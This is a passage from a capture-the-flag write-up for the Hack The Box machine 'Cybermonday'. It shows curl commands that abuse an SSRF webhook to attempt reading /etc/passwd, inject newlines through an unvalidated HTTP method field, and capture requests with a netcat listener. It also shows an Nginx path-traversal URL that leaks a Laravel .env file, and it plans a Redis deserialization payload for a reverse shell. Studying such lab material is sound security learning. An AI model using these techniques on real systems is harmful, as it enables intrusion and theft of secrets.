# Cybermonday - Obtaining More Info

[Initial Enumeration](/writeups/machines/htb-cybermonday/1-initial-enumeration)
[Webhook API Admin Access](/writeups/machines/htb-cybermonday/2-webhook-api-admin)
[**Obtaining More Info**](/writeups/machines/htb-cybermonday/3-obtaining-more-info)
[Gaining a Foothold](/writeups/machines/htb-cybermonday/4-gaining-a-foothold)
[Where to Now?](/writeups/machines/htb-cybermonday/5-where-to-now)
[Reading the Source](/writeups/machines/htb-cybermonday/6-reading-the-source)
[Composing Root Access](/writeups/machines/htb-cybermonday/7-composing-root-access)

Now that we have the ability to [[ssrf|make the web server send requests for us]], the question is what to do with it. The first thing to try would be to [[local-file-inclusion|get files on the system]]:
```bash
curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "file://etc/passwd", "method": "GET"}' -v

{"status":"error","message":"Only http protocol is allowed"}
```

Not going to be that easy unfortunately. With us only being able to make [[http|HTTP]] requests, the use right now seems limited. Let's use a [[netcat|`netcat`]] listener and send some requests to see what info the webhook is sending.
```bash
nc -lvnp 8080

curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "GET"}' -v

GET / HTTP/1.1
Host: <your ip>:8080
Accept: */*
```

Hmm, not much to go on here. What about a `POST`?
```bash
nc -lvnp 8080

curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "POST"}' -v

POST / HTTP/1.1
Host: <your ip>:8080
Accept: */*
```

Still very little. Well we've already tried messing around with the `url` with no luck but what about the `method`?
```bash
nc -lvnp 8080

curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "HMM"}' -v

HMM / HTTP/1.1
Host: <your ip>:8080
Accept: */*
```

I don't think `HMM` is a valid HTTP verb (though there are a lot more than you might think). So we can assume the `method` is not being validated, but how far does this go?
```bash
nc -lvnp 8080

curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "TEST\ntest 2"}' -v

TEST
test 2 / HTTP/1.1
Host: <your ip>:8080
Accept: */*
```

Okay, so now we have a way to send data to locations only the server can access. But what can we actually do with this? To figure that out lets first return to the Cybermonday shopping site. Now that we know it's running on [[laravel|Laravel]] we know there's a `.env` file that might contain some useful information. If we look at the headers we also know that the store is running behind an [[nginx|Nginx]] proxy server, which can often be misconfigured to allow for [[path-traversal|path traversal]]. Trying to use this on most paths just results in Laravel receiving the request and providing a `404` response. However if we look at the URL for some of the static images on the site we see there's also an `assets` path available. If you used [[gobuster|`gobuster`]] when first browsing the site you might have also found this directory. Navigating to the directory itself gives us an Nginx `403` message rather than a Laravel `404` which is promising. If we try the path traversal here: 
```
http://cybermonday.htb/assets../.env

APP_NAME=CyberMonday
APP_ENV=local
...
```

We now have an environment file with some very interesting information in it. Among this information is the Laravel `APP_KEY`, and information on both the [[redis|Redis server]] and [[mysql|MySQL server]] this app connects to.

As we can only send data with the webhook and not receive it without a valid HTTP response, the MySQL information is probably not going to be very useful, however Redis has a much [[redis#RESP|simpler protocol]] that doesn't require a back and forth to update information and settings. If you'd like to know more about it you can [read about the Redis RESP protocol here](https://redis.io/docs/reference/protocol-spec/). You might have noticed in the Laravel debug information from the profile page that the app is making use of [[session-poisoning|sessions]]. These sessions will be stored in the Redis server, so if we can find a way to inject a [[php|PHP]] [[deserialization|deserialization]] attack payload into the Redis server, we could potentially have a way to perform [[rce|RCE]] and gain a [[reverse-shell|reverse shell]].

Next: [Gaining a Foothold](/writeups/machines/htb-cybermonday/4-gaining-a-foothold)